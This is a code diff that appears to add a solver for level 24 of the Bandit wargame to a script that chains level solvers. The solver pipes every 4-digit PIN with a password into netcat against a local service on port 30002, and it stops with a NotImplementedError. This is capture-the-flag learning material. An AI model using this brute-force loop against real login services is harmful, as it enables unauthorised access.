@@ -285,6 +285,19 @@ def bandit23(password: str) -> str:
     return flag
 
 
+def bandit24(password: str) -> str:
+    cmd = "nc localhost 30002 << NC_END\n"
+    for pin in [f"{x:04d}" for x in range(10000)]:
+        cmd += f"{password} {pin}\n"
+    cmd += "NC_END\n"
+    flag = run_remote_command(
+        command=cmd, username="bandit24", password=password
+    ).strip()
+    print(flag)
+    raise NotImplementedError
+    return flag
+
+
 # this is the order that the solvers will be called in, essentially piped together
 def get_solvers() -> List[SolverType]:
     return [
@@ -312,4 +325,5 @@ def get_solvers() -> List[SolverType]:
         bandit21,
         bandit22,
         bandit23,
+        bandit24,
     ]
